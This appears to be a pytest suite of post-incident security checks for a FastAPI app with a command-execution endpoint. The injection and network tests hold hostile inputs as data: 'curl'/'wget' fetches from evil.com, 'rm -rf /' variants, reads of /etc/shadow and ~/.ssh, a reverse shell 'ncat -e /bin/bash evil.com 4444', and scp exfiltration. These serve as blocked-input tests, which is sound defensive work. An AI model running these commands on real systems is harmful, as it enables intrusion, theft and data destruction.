"""Post-incident security validation tests for production deployment readiness."""

import pytest
import requests
import asyncio
import time
import os
from fastapi.testclient import TestClient
from unittest.mock import patch, MagicMock

from app.main import create_app
from app.core.config import get_settings


@pytest.fixture
def client():
    """Create test client."""
    app = create_app()
    return TestClient(app)


@pytest.fixture
def auth_token(client):
    """Get authentication token for testing."""
    response = client.post("/api/auth/login", json={
        "username": "admin",
        "password": "admin123"
    })
    return response.json()["access_token"]


class TestCredentialRotationValidation:
    """Test credential rotation and security hardening."""
    
    def test_default_credentials_changed(self, client):
        """Verify default admin credentials have been changed from defaults."""
        # Test that default credentials no longer work
        response = client.post("/api/auth/login", json={
            "username": "admin",
            "password": "admin123"
        })
        
        # In production, this should fail with new credentials
        # For testing environment, we'll check if warnings are present
        if response.status_code == 200:
            # If login succeeds, there should be warnings about default creds
            warnings = response.headers.get("X-Security-Warning", "")
            pytest.skip("Default credentials still active - production should have different creds")
    
    def test_environment_variables_not_exposed(self, client):
        """Test that environment variables are not exposed via API."""
        endpoints_to_test = [
            "/api/health",
            "/api/config",
            "/api/system/info",
            "/api/debug",  # Should not exist
            "/api/env",    # Should not exist
        ]
        
        for endpoint in endpoints_to_test:
            response = client.get(endpoint)
            if response.status_code == 200:
                data = response.json()
                # Check that no sensitive environment variables are exposed
                sensitive_keys = [
                    "SECRET_KEY", "VERCEL_TOKEN", "GITHUB_TOKEN", 
                    "UPSTASH_REDIS_REST_URL", "UPSTASH_REDIS_REST_TOKEN",
                    "DATABASE_URL", "JWT_SECRET"
                ]
                
                response_text = str(data).lower()
                for key in sensitive_keys:
                    assert key.lower() not in response_text, f"Sensitive key {key} exposed in {endpoint}"
    
    def test_secure_headers_present(self, client):
        """Test that security headers are present in responses."""
        response = client.get("/api/health")
        
        required_security_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
        }
        
        for header, expected_value in required_security_headers.items():
            actual_value = response.headers.get(header)
            assert actual_value is not None, f"Missing security header: {header}"
            # For CSP and HSTS, just check they exist (values may vary)
            if header in ["Content-Security-Policy", "Strict-Transport-Security"]:
                assert len(actual_value) > 0, f"Empty security header: {header}"
    
    def test_cors_configuration_secure(self, client):
        """Test that CORS is properly configured and not overly permissive."""
        # Test CORS preflight
        response = client.options("/api/health", headers={
            "Origin": "http://malicious-site.com",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Authorization",
        })
        
        # Should not allow arbitrary origins
        allowed_origin = response.headers.get("Access-Control-Allow-Origin")
        if allowed_origin:
            assert allowed_origin != "*", "CORS allows all origins - security risk"
            assert "malicious-site.com" not in allowed_origin, "CORS allows malicious origins"
    
    def test_rate_limiting_active(self, client):
        """Test that rate limiting is active and properly configured."""
        # Test login rate limiting
        failed_attempts = 0
        rate_limited = False
        
        for i in range(15):  # Try 15 rapid requests
            response = client.post("/api/auth/login", json={
                "username": "admin",
                "password": "wrong_password"
            })
            
            if response.status_code == 429:
                rate_limited = True
                assert "rate limit" in response.json().get("detail", "").lower()
                break
            
            failed_attempts += 1
            time.sleep(0.1)  # Small delay
        
        # Should hit rate limit within reasonable attempts
        assert rate_limited or failed_attempts < 10, "Rate limiting not working properly"


class TestAuthenticationSecurityHardening:
    """Test authentication system security after incident."""
    
    def test_jwt_token_security(self, client, auth_token):
        """Test JWT token implementation security."""
        import jwt
        
        # Verify token structure without secret
        try:
            # Decode without verification to check structure
            unverified = jwt.decode(auth_token, options={"verify_signature": False})
            
            # Check for security best practices
            assert "exp" in unverified, "JWT missing expiration"
            assert "iat" in unverified, "JWT missing issued at"
            assert "user_id" in unverified, "JWT missing user ID"
            
            # Check expiration is reasonable (not too long)
            exp_time = unverified.get("exp", 0)
            iat_time = unverified.get("iat", 0)
            duration = exp_time - iat_time
            assert duration <= 24 * 3600, "JWT expiration too long (>24h)"
            
        except jwt.InvalidTokenError:
            pytest.fail("JWT token structure invalid")
    
    def test_session_management_security(self, client):
        """Test session management security features."""
        # Login to create session
        login_response = client.post("/api/auth/login", json={
            "username": "admin",
            "password": "admin123"
        })
        token = login_response.json()["access_token"]
        
        # Test concurrent session limits
        sessions = []
        for i in range(10):  # Try to create many sessions
            response = client.post("/api/auth/login", json={
                "username": "admin",
                "password": "admin123"
            })
            if response.status_code == 200:
                sessions.append(response.json()["access_token"])
        
        # Should have reasonable session limits
        assert len(sessions) <= 5, "Too many concurrent sessions allowed"
    
    def test_password_policy_enforcement(self, client):
        """Test password policy enforcement."""
        # Note: This would typically test user registration/password change
        # For now, verify existing password meets minimum requirements
        
        weak_passwords = [
            "123",
            "password",
            "admin",
            "test",
            "",
            "a" * 3,  # Too short
        ]
        
        # In a real system, these would be tested during password changes
        # For this test, we verify the auth system rejects weak attempts
        for weak_pass in weak_passwords:
            response = client.post("/api/auth/login", json={
                "username": "admin",
                "password": weak_pass
            })
            assert response.status_code == 401, f"Weak password accepted: {weak_pass}"
    
    def test_brute_force_protection(self, client):
        """Test brute force attack protection."""
        # Attempt multiple failed logins
        failed_attempts = 0
        for i in range(20):
            response = client.post("/api/auth/login", json={
                "username": "admin",
                "password": f"wrong_password_{i}"
            })
            
            if response.status_code == 429:
                # Rate limited - good
                break
            elif response.status_code == 401:
                failed_attempts += 1
            
            time.sleep(0.1)
        
        # Should be rate limited before too many attempts
        assert failed_attempts < 15, "Brute force protection insufficient"


class TestCommandInjectionHardening:
    """Test command injection protection after security incident."""
    
    def test_advanced_injection_patterns(self, client, auth_token):
        """Test protection against advanced injection patterns."""
        advanced_patterns = [
            # Command substitution variations
            "/plan $(curl http://evil.com/payload)",
            "/plan `wget -O- http://evil.com/script`",
            "/plan test; $(echo 'malicious' > /tmp/test)",
            
            # Process substitution
            "/plan <(curl http://evil.com/data)",
            
            # Here documents
            "/plan <<< 'cat /etc/passwd'",
            
            # Bash-specific features
            "/plan $((system('rm -rf /')))",
            "/plan ${system('malicious')}",
            
            # Unicode and encoding tricks
            "/plan \u{72}\u{6d} -rf /",  # Unicode 'rm'
            "/plan %72%6d -rf /",         # URL encoded 'rm'
            "/plan \\x72\\x6d -rf /",     # Hex encoded 'rm'
            
            # Whitespace variations
            "/plan\trm\n-rf\v/",
            "/plan rm\u00A0-rf /",  # Non-breaking space
            
            # Quote variations
            "/plan 'r''m' -rf /",
            "/plan \"r\"\"m\" -rf /",
            
            # Concatenation tricks
            "/plan r\\m -rf /",
            "/plan r$''m -rf /",
        ]
        
        for pattern in advanced_patterns:
            response = client.post("/api/commands/execute",
                json={"command": pattern, "session_id": "test"},
                headers={"Authorization": f"Bearer {auth_token}"}
            )
            
            # Should be blocked (400) or safely sanitized
            if response.status_code == 200:
                # If allowed, verify it was sanitized
                result = response.json()
                output = result.get("output", "").lower()
                error = result.get("error", "").lower()
                
                # Should not contain dangerous commands in output
                dangerous_indicators = ["removed", "no such file", "permission denied", "/etc/passwd"]
                has_dangerous_output = any(indicator in output for indicator in dangerous_indicators)
                assert not has_dangerous_output, f"Dangerous command may have executed: {pattern}"
            else:
                assert response.status_code == 400, f"Unexpected response for: {pattern}"
    
    def test_file_system_access_protection(self, client, auth_token):
        """Test file system access protection."""
        protected_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/version",
            "/sys/",
            "/dev/",
            "~/.ssh/",
            "/root/",
        ]
        
        for path in protected_paths:
            # Test various file access patterns
            commands = [
                f"/plan cat {path}",
                f"/plan less {path}",
                f"/plan head {path}",
                f"/plan tail {path}",
                f"/plan vim {path}",
                f"/plan nano {path}",
            ]
            
            for command in commands:
                response = client.post("/api/commands/execute",
                    json={"command": command, "session_id": "test"},
                    headers={"Authorization": f"Bearer {auth_token}"}
                )
                
                # Should be blocked or restricted
                if response.status_code == 200:
                    result = response.json()
                    output = result.get("output", "")
                    
                    # Should not contain sensitive file contents
                    sensitive_indicators = ["root:", "daemon:", "ssh-rsa", "BEGIN RSA", "kernel"]
                    has_sensitive_content = any(indicator in output for indicator in sensitive_indicators)
                    assert not has_sensitive_content, f"Sensitive file access allowed: {command}"


class TestNetworkSecurityValidation:
    """Test network security configurations."""
    
    def test_network_request_validation(self, client, auth_token):
        """Test network request validation and restrictions."""
        malicious_network_commands = [
            "curl http://evil.com",
            "wget http://malicious.site/payload",
            "nc -l 4444",
            "ncat -e /bin/bash evil.com 4444",
            "socat TCP-LISTEN:8080,fork EXEC:/bin/bash",
            "python -m http.server 8000",
            "ssh user@evil.com",
            "scp file user@evil.com:/tmp/",
            "rsync -av file user@evil.com:/tmp/",
        ]
        
        for command in malicious_network_commands:
            response = client.post("/api/commands/execute",
                json={"command": command, "session_id": "test"},
                headers={"Authorization": f"Bearer {auth_token}"}
            )
            
            # Should be blocked
            assert response.status_code == 400, f"Malicious network command allowed: {command}"
    
    def test_port_scanning_protection(self, client, auth_token):
        """Test protection against port scanning attempts."""
        port_scan_commands = [
            "nmap localhost",
            "nmap -p 1-65535 localhost",
            "nc -zv localhost 1-1000",
            "telnet localhost 22",
            "python -c \"import socket; s=socket.socket(); s.connect(('localhost', 22))\"",
        ]
        
        for command in port_scan_commands:
            response = client.post("/api/commands/execute",
                json={"command": command, "session_id": "test"},
                headers={"Authorization": f"Bearer {auth_token}"}
            )
            
            # Should be blocked or restricted
            assert response.status_code == 400, f"Port scanning command allowed: {command}"


class TestDeploymentSecurityValidation:
    """Test deployment-specific security configurations."""
    
    def test_debug_mode_disabled(self):
        """Test that debug mode is disabled in production."""
        settings = get_settings()
        
        # Check various debug-related settings
        assert not getattr(settings, 'DEBUG', True), "DEBUG mode should be disabled"
        assert not getattr(settings, 'TESTING', True), "TESTING mode should be disabled"
        
        # Check log level is appropriate
        log_level = getattr(settings, 'LOG_LEVEL', 'DEBUG')
        assert log_level.upper() in ['INFO', 'WARNING', 'ERROR'], f"Log level too verbose: {log_level}"
    
    def test_sensitive_endpoints_protected(self, client):
        """Test that sensitive endpoints are properly protected."""
        sensitive_endpoints = [
            "/api/debug",
            "/api/admin/debug",
            "/api/system/env",
            "/api/config/dump",
            "/docs",      # Should be protected in production
            "/redoc",     # Should be protected in production
            "/openapi.json",  # Should be protected in production
        ]
        
        for endpoint in sensitive_endpoints:
            response = client.get(endpoint)
            
            # Should be 404 (not exist) or 401/403 (protected)
            assert response.status_code in [404, 401, 403], f"Sensitive endpoint exposed: {endpoint}"
    
    def test_error_messages_sanitized(self, client):
        """Test that error messages don't leak sensitive information."""
        # Test various error conditions
        error_test_cases = [
            # Invalid JSON
            ("/api/auth/login", "invalid json", "application/json"),
            # Invalid endpoints
            ("/api/nonexistent", None, None),
            # Malformed requests
            ("/api/commands/execute", '{"malformed": json}', "application/json"),
        ]
        
        for endpoint, data, content_type in error_test_cases:
            headers = {"Content-Type": content_type} if content_type else {}
            
            if data:
                response = client.post(endpoint, data=data, headers=headers)
            else:
                response = client.get(endpoint)
            
            if response.status_code >= 400:
                error_response = response.json() if response.headers.get("content-type", "").startswith("application/json") else response.text
                error_text = str(error_response).lower()
                
                # Check for information leakage
                sensitive_info = [
                    "traceback", "exception", "file path", "/users/", "/home/",
                    "database", "secret", "token", "password", "key=",
                    "stack trace", "internal error", "debug info"
                ]
                
                for info in sensitive_info:
                    assert info not in error_text, f"Error message leaks info: {info} in {endpoint}"


class TestProductionReadinessValidation:
    """Test overall production readiness after security incident."""
    
    def test_security_monitoring_active(self, client, auth_token):
        """Test that security monitoring is active."""
        # Test that security events are logged
        # This would typically check logging infrastructure
        
        # Make some security-relevant requests
        security_events = [
            # Failed login
            client.post("/api/auth/login", json={"username": "admin", "password": "wrong"}),
            # Invalid token usage
            client.get("/api/auth/me", headers={"Authorization": "Bearer invalid"}),
            # Attempt dangerous command
            client.post("/api/commands/execute", 
                       json={"command": "rm -rf /", "session_id": "test"},
                       headers={"Authorization": f"Bearer {auth_token}"}),
        ]
        
        # In a real system, we'd verify these events are logged
        # For now, just verify the responses are appropriate
        for response in security_events:
            assert response.status_code in [400, 401, 403], "Security event not handled properly"
    
    def test_backup_and_recovery_ready(self):
        """Test that backup and recovery mechanisms are in place."""
        # This would test backup configurations, data persistence, etc.
        # For now, verify basic database connectivity
        
        # Test database connection
        settings = get_settings()
        assert hasattr(settings, 'DATABASE_URL') or hasattr(settings, 'UPSTASH_REDIS_REST_URL'), "Database configuration missing"
    
    def test_environment_segregation(self):
        """Test that environment segregation is proper."""
        settings = get_settings()
        
        # Test that production settings are different from development
        # This would be environment-specific
        
        # Check that sensitive defaults are changed
        if hasattr(settings, 'SECRET_KEY'):
            # Should not be a common default
            default_secrets = ['secret', 'development', 'test', 'changeme', 'default']
            secret_lower = settings.SECRET_KEY.lower()
            for default in default_secrets:
                assert default not in secret_lower, f"Using default secret key: {default}"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])